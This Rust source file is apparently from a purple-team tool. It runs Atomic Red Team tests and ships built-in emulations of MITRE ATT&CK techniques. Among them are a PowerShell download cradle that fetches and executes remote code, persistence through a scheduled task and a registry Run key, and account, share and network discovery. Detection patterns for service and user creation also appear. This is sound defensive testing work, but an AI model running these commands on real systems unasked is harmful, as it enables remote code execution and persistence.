//! Atomic Red Team Test Executor
//!
//! Executes Atomic Red Team tests for purple team exercises.
//! Supports YAML-based test definitions from the Atomic Red Team repository.
//!
//! Reference: https://github.com/redcanaryco/atomic-red-team

use anyhow::{anyhow, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use tokio::process::Command;
use uuid::Uuid;

// ============================================================================
// Atomic Red Team Types
// ============================================================================

/// An Atomic Red Team test definition
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AtomicTest {
    /// Unique identifier
    pub id: String,
    /// Test name
    pub name: String,
    /// MITRE ATT&CK technique ID (e.g., T1003.001)
    pub technique_id: String,
    /// Description of the test
    pub description: String,
    /// Supported execution platforms
    pub supported_platforms: Vec<Platform>,
    /// Input arguments for the test
    #[serde(default)]
    pub input_arguments: HashMap<String, InputArgument>,
    /// Dependencies required before execution
    #[serde(default)]
    pub dependencies: Vec<Dependency>,
    /// Command executor configuration
    pub executor: Executor,
    /// Cleanup commands (optional)
    pub cleanup_command: Option<String>,
}

/// Supported platforms for atomic tests
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Platform {
    Windows,
    Linux,
    Macos,
    Office365,
    Azure,
    Gcp,
    Aws,
    Containers,
}

impl Platform {
    /// Get the current platform
    pub fn current() -> Self {
        #[cfg(target_os = "windows")]
        return Platform::Windows;
        #[cfg(target_os = "linux")]
        return Platform::Linux;
        #[cfg(target_os = "macos")]
        return Platform::Macos;
        #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
        return Platform::Linux;
    }
}

impl std::fmt::Display for Platform {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Platform::Windows => write!(f, "windows"),
            Platform::Linux => write!(f, "linux"),
            Platform::Macos => write!(f, "macos"),
            Platform::Office365 => write!(f, "office365"),
            Platform::Azure => write!(f, "azure"),
            Platform::Gcp => write!(f, "gcp"),
            Platform::Aws => write!(f, "aws"),
            Platform::Containers => write!(f, "containers"),
        }
    }
}

/// Input argument definition for atomic test
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InputArgument {
    /// Description of the argument
    pub description: String,
    /// Argument data type
    #[serde(rename = "type", default = "default_arg_type")]
    pub arg_type: String,
    /// Default value if not provided
    pub default: Option<String>,
}

fn default_arg_type() -> String {
    "string".to_string()
}

/// Dependency required before test execution
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Dependency {
    /// Description of what's being checked
    pub description: String,
    /// Command to check if dependency is met
    #[serde(rename = "prereq_command")]
    pub prereq_command: Option<String>,
    /// Command to install/resolve the dependency
    #[serde(rename = "get_prereq_command")]
    pub get_prereq_command: Option<String>,
}

/// Command executor configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Executor {
    /// Executor name (powershell, cmd, bash, sh, etc.)
    pub name: ExecutorType,
    /// Whether elevation is required
    #[serde(default)]
    pub elevation_required: bool,
    /// Command to execute
    pub command: String,
    /// Cleanup command (alternative location)
    pub cleanup_command: Option<String>,
}

/// Type of command executor
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ExecutorType {
    PowerShell,
    Cmd,
    Bash,
    Sh,
    Manual,
    #[serde(rename = "command_prompt")]
    CommandPrompt,
}

impl std::fmt::Display for ExecutorType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ExecutorType::PowerShell => write!(f, "powershell"),
            ExecutorType::Cmd | ExecutorType::CommandPrompt => write!(f, "cmd"),
            ExecutorType::Bash => write!(f, "bash"),
            ExecutorType::Sh => write!(f, "sh"),
            ExecutorType::Manual => write!(f, "manual"),
        }
    }
}

/// Result of executing an atomic test
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AtomicTestResult {
    /// Unique execution ID
    pub execution_id: String,
    /// Test ID
    pub test_id: String,
    /// Technique ID
    pub technique_id: String,
    /// Test name
    pub test_name: String,
    /// Execution status
    pub status: ExecutionStatus,
    /// Command that was executed
    pub executed_command: String,
    /// Standard output
    pub stdout: String,
    /// Standard error
    pub stderr: String,
    /// Exit code
    pub exit_code: Option<i32>,
    /// Execution duration in milliseconds
    pub duration_ms: u64,
    /// Artifacts generated during execution
    pub artifacts: Vec<ExecutionArtifact>,
    /// Start time
    pub started_at: DateTime<Utc>,
    /// End time
    pub completed_at: DateTime<Utc>,
    /// Error message if failed
    pub error_message: Option<String>,
    /// Whether cleanup was executed
    pub cleanup_executed: bool,
    /// Cleanup result if executed
    pub cleanup_result: Option<String>,
}

/// Status of test execution
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ExecutionStatus {
    /// Execution successful (exit code 0)
    Success,
    /// Execution completed but non-zero exit code
    CompletedWithErrors,
    /// Execution failed
    Failed,
    /// Test was skipped (platform mismatch, etc.)
    Skipped,
    /// Execution timed out
    Timeout,
    /// Dependencies not met
    DependencyFailed,
}

/// Artifact generated during test execution
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecutionArtifact {
    /// Type of artifact
    pub artifact_type: ArtifactType,
    /// Path or identifier
    pub path: Option<String>,
    /// Description
    pub description: String,
    /// Hash (if file)
    pub hash: Option<String>,
    /// Whether artifact was cleaned up
    pub cleaned_up: bool,
}

/// Type of execution artifact
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ArtifactType {
    File,
    Process,
    Registry,
    Network,
    Service,
    ScheduledTask,
    User,
    Other,
}

// ============================================================================
// Atomic Red Team Executor
// ============================================================================

/// Configuration for the Atomic Red Team executor
#[derive(Debug, Clone)]
pub struct AtomicExecutorConfig {
    /// Path to Atomic Red Team test definitions
    pub atomics_path: PathBuf,
    /// Timeout for test execution in seconds
    pub timeout_secs: u64,
    /// Whether to run cleanup after tests
    pub run_cleanup: bool,
    /// Whether to check dependencies before execution
    pub check_dependencies: bool,
    /// Whether to resolve dependencies automatically
    pub auto_resolve_dependencies: bool,
    /// Maximum output size to capture (bytes)
    pub max_output_size: usize,
    /// Working directory for test execution
    pub working_dir: Option<PathBuf>,
}

impl Default for AtomicExecutorConfig {
    fn default() -> Self {
        Self {
            atomics_path: PathBuf::from("/opt/atomic-red-team/atomics"),
            timeout_secs: 120,
            run_cleanup: true,
            check_dependencies: true,
            auto_resolve_dependencies: false,
            max_output_size: 1024 * 1024, // 1MB
            working_dir: None,
        }
    }
}

/// Atomic Red Team test executor
pub struct AtomicExecutor {
    config: AtomicExecutorConfig,
    /// Cached test definitions
    test_cache: HashMap<String, Vec<AtomicTest>>,
}

impl AtomicExecutor {
    /// Create a new executor with default configuration
    pub fn new() -> Self {
        Self::with_config(AtomicExecutorConfig::default())
    }

    /// Create a new executor with custom configuration
    pub fn with_config(config: AtomicExecutorConfig) -> Self {
        Self {
            config,
            test_cache: HashMap::new(),
        }
    }

    /// Load atomic tests for a technique from YAML files
    pub async fn load_tests(&mut self, technique_id: &str) -> Result<Vec<AtomicTest>> {
        // Check cache first
        if let Some(tests) = self.test_cache.get(technique_id) {
            return Ok(tests.clone());
        }

        // Build path to technique directory
        let technique_path = self.config.atomics_path.join(technique_id);
        let yaml_path = technique_path.join(format!("{}.yaml", technique_id));

        if !yaml_path.exists() {
            return Err(anyhow!("Atomic test file not found: {:?}", yaml_path));
        }

        // Read and parse YAML
        let yaml_content = tokio::fs::read_to_string(&yaml_path).await?;
        let technique_def: TechniqueDefinition = serde_yaml::from_str(&yaml_content)?;

        // Extract tests and add technique info
        let tests: Vec<AtomicTest> = technique_def.atomic_tests.into_iter()
            .enumerate()
            .map(|(i, mut test)| {
                test.id = format!("{}-{}", technique_id, i + 1);
                test.technique_id = technique_id.to_string();
                test
            })
            .collect();

        // Cache the tests
        self.test_cache.insert(technique_id.to_string(), tests.clone());

        Ok(tests)
    }

    /// Execute a specific atomic test
    pub async fn execute_test(
        &self,
        test: &AtomicTest,
        input_args: &HashMap<String, String>,
    ) -> Result<AtomicTestResult> {
        let execution_id = Uuid::new_v4().to_string();
        let started_at = Utc::now();

        // Check platform compatibility
        let current_platform = Platform::current();
        if !test.supported_platforms.contains(&current_platform) {
            return Ok(AtomicTestResult {
                execution_id,
                test_id: test.id.clone(),
                technique_id: test.technique_id.clone(),
                test_name: test.name.clone(),
                status: ExecutionStatus::Skipped,
                executed_command: String::new(),
                stdout: String::new(),
                stderr: format!("Platform {} not supported. Supported: {:?}",
                    current_platform, test.supported_platforms),
                exit_code: None,
                duration_ms: 0,
                artifacts: vec![],
                started_at,
                completed_at: Utc::now(),
                error_message: Some("Platform not supported".to_string()),
                cleanup_executed: false,
                cleanup_result: None,
            });
        }

        // Check dependencies if configured
        if self.config.check_dependencies {
            for dep in &test.dependencies {
                if let Err(e) = self.check_dependency(dep, &test.executor).await {
                    if self.config.auto_resolve_dependencies {
                        if let Err(resolve_err) = self.resolve_dependency(dep, &test.executor).await {
                            return Ok(AtomicTestResult {
                                execution_id,
                                test_id: test.id.clone(),
                                technique_id: test.technique_id.clone(),
                                test_name: test.name.clone(),
                                status: ExecutionStatus::DependencyFailed,
                                executed_command: String::new(),
                                stdout: String::new(),
                                stderr: format!("Dependency check failed: {}. Resolution failed: {}",
                                    e, resolve_err),
                                exit_code: None,
                                duration_ms: 0,
                                artifacts: vec![],
                                started_at,
                                completed_at: Utc::now(),
                                error_message: Some(format!("Dependency failed: {}", e)),
                                cleanup_executed: false,
                                cleanup_result: None,
                            });
                        }
                    } else {
                        return Ok(AtomicTestResult {
                            execution_id,
                            test_id: test.id.clone(),
                            technique_id: test.technique_id.clone(),
                            test_name: test.name.clone(),
                            status: ExecutionStatus::DependencyFailed,
                            executed_command: String::new(),
                            stdout: String::new(),
                            stderr: format!("Dependency not met: {} - {}", dep.description, e),
                            exit_code: None,
                            duration_ms: 0,
                            artifacts: vec![],
                            started_at,
                            completed_at: Utc::now(),
                            error_message: Some(format!("Dependency failed: {}", e)),
                            cleanup_executed: false,
                            cleanup_result: None,
                        });
                    }
                }
            }
        }

        // Prepare the command with input arguments substituted
        let command = self.substitute_arguments(&test.executor.command, &test.input_arguments, input_args);

        // Execute the command
        let exec_start = std::time::Instant::now();
        let result = self.execute_command(&command, &test.executor.name).await;
        let duration_ms = exec_start.elapsed().as_millis() as u64;

        let (status, stdout, stderr, exit_code, error_message) = match result {
            Ok((output, code)) => {
                let status = if code == 0 {
                    ExecutionStatus::Success
                } else {
                    ExecutionStatus::CompletedWithErrors
                };
                (status, output.0, output.1, Some(code), None)
            }
            Err(e) => {
                (ExecutionStatus::Failed, String::new(), String::new(), None, Some(e.to_string()))
            }
        };

        // Detect artifacts from command output
        let artifacts = self.detect_artifacts(&stdout, &stderr, &command);

        // Run cleanup if configured
        let (cleanup_executed, cleanup_result) = if self.config.run_cleanup {
            let cleanup_cmd = test.cleanup_command.as_ref()
                .or(test.executor.cleanup_command.as_ref());

            if let Some(cleanup) = cleanup_cmd {
                let cleanup_cmd = self.substitute_arguments(cleanup, &test.input_arguments, input_args);
                match self.execute_command(&cleanup_cmd, &test.executor.name).await {
                    Ok((output, _)) => (true, Some(output.0)),
                    Err(e) => (true, Some(format!("Cleanup failed: {}", e))),
                }
            } else {
                (false, None)
            }
        } else {
            (false, None)
        };

        Ok(AtomicTestResult {
            execution_id,
            test_id: test.id.clone(),
            technique_id: test.technique_id.clone(),
            test_name: test.name.clone(),
            status,
            executed_command: command,
            stdout,
            stderr,
            exit_code,
            duration_ms,
            artifacts,
            started_at,
            completed_at: Utc::now(),
            error_message,
            cleanup_executed,
            cleanup_result,
        })
    }

    /// Execute all tests for a technique
    pub async fn execute_technique(
        &mut self,
        technique_id: &str,
        input_args: &HashMap<String, String>,
    ) -> Result<Vec<AtomicTestResult>> {
        let tests = self.load_tests(technique_id).await?;
        let mut results = Vec::new();

        for test in &tests {
            let result = self.execute_test(test, input_args).await?;
            results.push(result);
        }

        Ok(results)
    }

    /// Execute a specific test by index
    pub async fn execute_test_by_index(
        &mut self,
        technique_id: &str,
        test_index: usize,
        input_args: &HashMap<String, String>,
    ) -> Result<AtomicTestResult> {
        let tests = self.load_tests(technique_id).await?;

        let test = tests.get(test_index)
            .ok_or_else(|| anyhow!("Test index {} not found for {}", test_index, technique_id))?;

        self.execute_test(test, input_args).await
    }

    /// List available techniques
    pub async fn list_techniques(&self) -> Result<Vec<String>> {
        let mut techniques = Vec::new();

        if !self.config.atomics_path.exists() {
            return Err(anyhow!("Atomics path does not exist: {:?}", self.config.atomics_path));
        }

        let mut entries = tokio::fs::read_dir(&self.config.atomics_path).await?;
        while let Some(entry) = entries.next_entry().await? {
            if entry.file_type().await?.is_dir() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.starts_with('T') {
                    techniques.push(name);
                }
            }
        }

        techniques.sort();
        Ok(techniques)
    }

    /// Get test info without loading full details
    pub async fn get_test_info(&mut self, technique_id: &str) -> Result<Vec<TestInfo>> {
        let tests = self.load_tests(technique_id).await?;

        Ok(tests.iter().map(|t| TestInfo {
            id: t.id.clone(),
            name: t.name.clone(),
            technique_id: t.technique_id.clone(),
            description: t.description.clone(),
            supported_platforms: t.supported_platforms.clone(),
            elevation_required: t.executor.elevation_required,
            executor_type: t.executor.name,
            has_cleanup: t.cleanup_command.is_some() || t.executor.cleanup_command.is_some(),
            input_arguments: t.input_arguments.keys().cloned().collect(),
        }).collect())
    }

    // ========================================================================
    // Private Helper Methods
    // ========================================================================

    /// Substitute input arguments in command string
    fn substitute_arguments(
        &self,
        command: &str,
        arg_defs: &HashMap<String, InputArgument>,
        input_args: &HashMap<String, String>,
    ) -> String {
        let mut result = command.to_string();

        for (name, def) in arg_defs {
            let placeholder = format!("#{{{}}}", name);
            let value = input_args.get(name)
                .or(def.default.as_ref())
                .cloned()
                .unwrap_or_default();
            result = result.replace(&placeholder, &value);
        }

        result
    }

    /// Execute a command using the appropriate executor
    async fn execute_command(
        &self,
        command: &str,
        executor: &ExecutorType,
    ) -> Result<((String, String), i32)> {
        let (program, args) = match executor {
            ExecutorType::PowerShell => {
                ("powershell.exe", vec!["-NoProfile", "-NonInteractive", "-Command", command])
            }
            ExecutorType::Cmd | ExecutorType::CommandPrompt => {
                ("cmd.exe", vec!["/C", command])
            }
            ExecutorType::Bash => {
                ("bash", vec!["-c", command])
            }
            ExecutorType::Sh => {
                ("sh", vec!["-c", command])
            }
            ExecutorType::Manual => {
                return Err(anyhow!("Manual execution not supported"));
            }
        };

        let mut cmd = Command::new(program);
        cmd.args(&args)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());

        if let Some(ref work_dir) = self.config.working_dir {
            cmd.current_dir(work_dir);
        }

        let output = tokio::time::timeout(
            std::time::Duration::from_secs(self.config.timeout_secs),
            cmd.output()
        ).await
            .map_err(|_| anyhow!("Command timed out after {} seconds", self.config.timeout_secs))?
            .map_err(|e| anyhow!("Failed to execute command: {}", e))?;

        let stdout = String::from_utf8_lossy(&output.stdout)
            .chars()
            .take(self.config.max_output_size)
            .collect();
        let stderr = String::from_utf8_lossy(&output.stderr)
            .chars()
            .take(self.config.max_output_size)
            .collect();
        let exit_code = output.status.code().unwrap_or(-1);

        Ok(((stdout, stderr), exit_code))
    }

    /// Check if a dependency is met
    async fn check_dependency(&self, dep: &Dependency, executor: &Executor) -> Result<()> {
        if let Some(ref prereq_cmd) = dep.prereq_command {
            let result = self.execute_command(prereq_cmd, &executor.name).await;
            match result {
                Ok((_, code)) if code == 0 => Ok(()),
                Ok((output, _)) => Err(anyhow!("Prereq check failed: {}", output.1)),
                Err(e) => Err(anyhow!("Prereq check error: {}", e)),
            }
        } else {
            Ok(()) // No check command means assume it's met
        }
    }

    /// Attempt to resolve a dependency
    async fn resolve_dependency(&self, dep: &Dependency, executor: &Executor) -> Result<()> {
        if let Some(ref get_cmd) = dep.get_prereq_command {
            let result = self.execute_command(get_cmd, &executor.name).await;
            match result {
                Ok((_, 0)) => {
                    // Verify the dependency is now met
                    self.check_dependency(dep, executor).await
                }
                Ok((output, _)) => Err(anyhow!("Dependency resolution failed: {}", output.1)),
                Err(e) => Err(anyhow!("Dependency resolution error: {}", e)),
            }
        } else {
            Err(anyhow!("No resolution command available for dependency: {}", dep.description))
        }
    }

    /// Detect artifacts from command output
    fn detect_artifacts(&self, stdout: &str, stderr: &str, command: &str) -> Vec<ExecutionArtifact> {
        let mut artifacts = Vec::new();
        let combined = format!("{}\n{}\n{}", command, stdout, stderr);

        // Detect file paths (Windows)
        let file_pattern = regex::Regex::new(r#"[A-Z]:\\[^\s\r\n<>|:*?""]+"#).ok();
        if let Some(re) = file_pattern {
            for cap in re.find_iter(&combined) {
                artifacts.push(ExecutionArtifact {
                    artifact_type: ArtifactType::File,
                    path: Some(cap.as_str().to_string()),
                    description: "File path detected in output".to_string(),
                    hash: None,
                    cleaned_up: false,
                });
            }
        }

        // Detect Unix file paths
        let unix_pattern = regex::Regex::new(r#"(?:/[^\s\r\n]+)+"#).ok();
        if let Some(re) = unix_pattern {
            for cap in re.find_iter(&combined) {
                let path = cap.as_str();
                if path.len() > 5 && !path.contains("//") {
                    artifacts.push(ExecutionArtifact {
                        artifact_type: ArtifactType::File,
                        path: Some(path.to_string()),
                        description: "File path detected in output".to_string(),
                        hash: None,
                        cleaned_up: false,
                    });
                }
            }
        }

        // Detect registry keys
        if combined.contains(r#"HKLM\"#) || combined.contains(r#"HKCU\"#) || combined.contains(r#"HKU\"#) {
            let reg_pattern = regex::Regex::new(r"HK[A-Z_]+\\[^\s\r\n]+").ok();
            if let Some(re) = reg_pattern {
                for cap in re.find_iter(&combined) {
                    artifacts.push(ExecutionArtifact {
                        artifact_type: ArtifactType::Registry,
                        path: Some(cap.as_str().to_string()),
                        description: "Registry key detected".to_string(),
                        hash: None,
                        cleaned_up: false,
                    });
                }
            }
        }

        // Detect service creation
        if combined.contains("sc create") || combined.contains("New-Service") {
            artifacts.push(ExecutionArtifact {
                artifact_type: ArtifactType::Service,
                path: None,
                description: "Service creation detected".to_string(),
                hash: None,
                cleaned_up: false,
            });
        }

        // Detect scheduled task creation
        if combined.contains("schtasks /create") || combined.contains("Register-ScheduledTask") {
            artifacts.push(ExecutionArtifact {
                artifact_type: ArtifactType::ScheduledTask,
                path: None,
                description: "Scheduled task creation detected".to_string(),
                hash: None,
                cleaned_up: false,
            });
        }

        // Detect user creation
        if combined.contains("net user") && combined.contains("/add") {
            artifacts.push(ExecutionArtifact {
                artifact_type: ArtifactType::User,
                path: None,
                description: "User account creation detected".to_string(),
                hash: None,
                cleaned_up: false,
            });
        }

        // Detect network connections
        let ip_pattern = regex::Regex::new(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+").ok();
        if let Some(re) = ip_pattern {
            for cap in re.find_iter(&combined) {
                artifacts.push(ExecutionArtifact {
                    artifact_type: ArtifactType::Network,
                    path: Some(cap.as_str().to_string()),
                    description: "Network connection detected".to_string(),
                    hash: None,
                    cleaned_up: false,
                });
            }
        }

        artifacts
    }
}

impl Default for AtomicExecutor {
    fn default() -> Self {
        Self::new()
    }
}

// ============================================================================
// Supporting Types
// ============================================================================

/// YAML structure for technique definition file
#[derive(Debug, Clone, Deserialize)]
struct TechniqueDefinition {
    #[serde(rename = "attack_technique")]
    pub attack_technique: String,
    #[serde(rename = "display_name")]
    pub display_name: String,
    pub atomic_tests: Vec<AtomicTest>,
}

/// Simplified test info for listing
#[derive(Debug, Clone, Serialize)]
pub struct TestInfo {
    pub id: String,
    pub name: String,
    pub technique_id: String,
    pub description: String,
    pub supported_platforms: Vec<Platform>,
    pub elevation_required: bool,
    pub executor_type: ExecutorType,
    pub has_cleanup: bool,
    pub input_arguments: Vec<String>,
}

// ============================================================================
// Built-in Atomic Tests (for common techniques without YAML files)
// ============================================================================

/// Built-in atomic tests for common MITRE techniques
pub struct BuiltInAtomics;

impl BuiltInAtomics {
    /// Get built-in test for a technique if available
    pub fn get_test(technique_id: &str) -> Option<AtomicTest> {
        match technique_id {
            "T1003.001" => Some(Self::t1003_001_lsass_memory()),
            "T1059.001" => Some(Self::t1059_001_powershell()),
            "T1087.001" => Some(Self::t1087_001_local_account_discovery()),
            "T1053.005" => Some(Self::t1053_005_scheduled_task()),
            "T1547.001" => Some(Self::t1547_001_registry_run_keys()),
            "T1018" => Some(Self::t1018_remote_system_discovery()),
            "T1046" => Some(Self::t1046_network_service_discovery()),
            "T1135" => Some(Self::t1135_network_share_discovery()),
            _ => None,
        }
    }

    fn t1003_001_lsass_memory() -> AtomicTest {
        AtomicTest {
            id: "T1003.001-builtin".to_string(),
            name: "Dump LSASS Memory using Windows Task Manager".to_string(),
            technique_id: "T1003.001".to_string(),
            description: "Simulates LSASS memory access patterns for detection testing".to_string(),
            supported_platforms: vec![Platform::Windows],
            input_arguments: HashMap::new(),
            dependencies: vec![],
            executor: Executor {
                name: ExecutorType::PowerShell,
                elevation_required: true,
                command: r#"
                    # Simulate LSASS access for detection testing (no actual credential dump)
                    $lsass = Get-Process lsass -ErrorAction SilentlyContinue
                    if ($lsass) {
                        Write-Output "LSASS Process ID: $($lsass.Id)"
                        Write-Output "Test completed - detection should trigger on process access"
                    }
                "#.to_string(),
                cleanup_command: None,
            },
            cleanup_command: None,
        }
    }

    fn t1059_001_powershell() -> AtomicTest {
        AtomicTest {
            id: "T1059.001-builtin".to_string(),
            name: "PowerShell Download Cradle".to_string(),
            technique_id: "T1059.001".to_string(),
            description: "Executes a PowerShell download cradle for detection testing".to_string(),
            supported_platforms: vec![Platform::Windows],
            input_arguments: HashMap::from([
                ("url".to_string(), InputArgument {
                    description: "URL to download from (use httpbin for testing)".to_string(),
                    arg_type: "url".to_string(),
                    default: Some("https://httpbin.org/get".to_string()),
                }),
            ]),
            dependencies: vec![],
            executor: Executor {
                name: ExecutorType::PowerShell,
                elevation_required: false,
                command: "IEX (New-Object Net.WebClient).DownloadString('#{url}')".to_string(),
                cleanup_command: None,
            },
            cleanup_command: None,
        }
    }

    fn t1087_001_local_account_discovery() -> AtomicTest {
        AtomicTest {
            id: "T1087.001-builtin".to_string(),
            name: "Enumerate Local User Accounts".to_string(),
            technique_id: "T1087.001".to_string(),
            description: "Enumerate local user accounts using net user command".to_string(),
            supported_platforms: vec![Platform::Windows],
            input_arguments: HashMap::new(),
            dependencies: vec![],
            executor: Executor {
                name: ExecutorType::Cmd,
                elevation_required: false,
                command: "net user".to_string(),
                cleanup_command: None,
            },
            cleanup_command: None,
        }
    }

    fn t1053_005_scheduled_task() -> AtomicTest {
        AtomicTest {
            id: "T1053.005-builtin".to_string(),
            name: "Create Scheduled Task for Persistence".to_string(),
            technique_id: "T1053.005".to_string(),
            description: "Create a scheduled task for persistence (test task)".to_string(),
            supported_platforms: vec![Platform::Windows],
            input_arguments: HashMap::from([
                ("task_name".to_string(), InputArgument {
                    description: "Name of the scheduled task".to_string(),
                    arg_type: "string".to_string(),
                    default: Some("HeroForgeTestTask".to_string()),
                }),
            ]),
            dependencies: vec![],
            executor: Executor {
                name: ExecutorType::Cmd,
                elevation_required: true,
                command: r##"schtasks /create /sc daily /tn "#{task_name}" /tr "cmd /c echo test" /st 00:00 /f"##.to_string(),
                cleanup_command: Some(r##"schtasks /delete /tn "#{task_name}" /f"##.to_string()),
            },
            cleanup_command: None,
        }
    }

    fn t1547_001_registry_run_keys() -> AtomicTest {
        AtomicTest {
            id: "T1547.001-builtin".to_string(),
            name: "Add Registry Run Key for Persistence".to_string(),
            technique_id: "T1547.001".to_string(),
            description: "Add a Run key entry for persistence testing".to_string(),
            supported_platforms: vec![Platform::Windows],
            input_arguments: HashMap::from([
                ("key_name".to_string(), InputArgument {
                    description: "Name of the registry value".to_string(),
                    arg_type: "string".to_string(),
                    default: Some("HeroForgeTest".to_string()),
                }),
            ]),
            dependencies: vec![],
            executor: Executor {
                name: ExecutorType::PowerShell,
                elevation_required: false,
                command: r##"Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "#{key_name}" -Value "cmd /c echo test""##.to_string(),
                cleanup_command: Some(r##"Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "#{key_name}" -ErrorAction SilentlyContinue"##.to_string()),
            },
            cleanup_command: None,
        }
    }

    fn t1018_remote_system_discovery() -> AtomicTest {
        AtomicTest {
            id: "T1018-builtin".to_string(),
            name: "Remote System Discovery".to_string(),
            technique_id: "T1018".to_string(),
            description: "Discover remote systems on the network".to_string(),
            supported_platforms: vec![Platform::Windows, Platform::Linux],
            input_arguments: HashMap::new(),
            dependencies: vec![],
            executor: Executor {
                name: ExecutorType::Cmd,
                elevation_required: false,
                command: "net view".to_string(),
                cleanup_command: None,
            },
            cleanup_command: None,
        }
    }

    fn t1046_network_service_discovery() -> AtomicTest {
        AtomicTest {
            id: "T1046-builtin".to_string(),
            name: "Network Service Discovery".to_string(),
            technique_id: "T1046".to_string(),
            description: "Scan for network services".to_string(),
            supported_platforms: vec![Platform::Windows, Platform::Linux],
            input_arguments: HashMap::from([
                ("target".to_string(), InputArgument {
                    description: "Target to scan".to_string(),
                    arg_type: "string".to_string(),
                    default: Some("127.0.0.1".to_string()),
                }),
            ]),
            dependencies: vec![],
            executor: Executor {
                name: ExecutorType::PowerShell,
                elevation_required: false,
                command: r##"Test-NetConnection -ComputerName "#{target}" -Port 445 -WarningAction SilentlyContinue"##.to_string(),
                cleanup_command: None,
            },
            cleanup_command: None,
        }
    }

    fn t1135_network_share_discovery() -> AtomicTest {
        AtomicTest {
            id: "T1135-builtin".to_string(),
            name: "Network Share Discovery".to_string(),
            technique_id: "T1135".to_string(),
            description: "Discover network shares".to_string(),
            supported_platforms: vec![Platform::Windows],
            input_arguments: HashMap::new(),
            dependencies: vec![],
            executor: Executor {
                name: ExecutorType::Cmd,
                elevation_required: false,
                command: "net share".to_string(),
                cleanup_command: None,
            },
            cleanup_command: None,
        }
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_platform_current() {
        let platform = Platform::current();
        #[cfg(target_os = "linux")]
        assert_eq!(platform, Platform::Linux);
        #[cfg(target_os = "windows")]
        assert_eq!(platform, Platform::Windows);
    }

    #[test]
    fn test_builtin_tests() {
        let test = BuiltInAtomics::get_test("T1003.001");
        assert!(test.is_some());
        let test = test.unwrap();
        assert_eq!(test.technique_id, "T1003.001");
        assert!(test.executor.elevation_required);
    }

    #[test]
    fn test_argument_substitution() {
        let executor = AtomicExecutor::new();

        let mut arg_defs = HashMap::new();
        arg_defs.insert("target".to_string(), InputArgument {
            description: "Target".to_string(),
            arg_type: "string".to_string(),
            default: Some("localhost".to_string()),
        });

        let mut input_args = HashMap::new();
        input_args.insert("target".to_string(), "192.168.1.1".to_string());

        let command = "ping #{target}";
        let result = executor.substitute_arguments(command, &arg_defs, &input_args);
        assert_eq!(result, "ping 192.168.1.1");
    }

    #[test]
    fn test_artifact_detection() {
        let executor = AtomicExecutor::new();

        let stdout = r"Created file C:\Windows\Temp\test.exe";
        let stderr = "";
        let command = "echo test";

        let artifacts = executor.detect_artifacts(stdout, stderr, command);
        assert!(!artifacts.is_empty());
        assert!(artifacts.iter().any(|a| a.artifact_type == ArtifactType::File));
    }
}
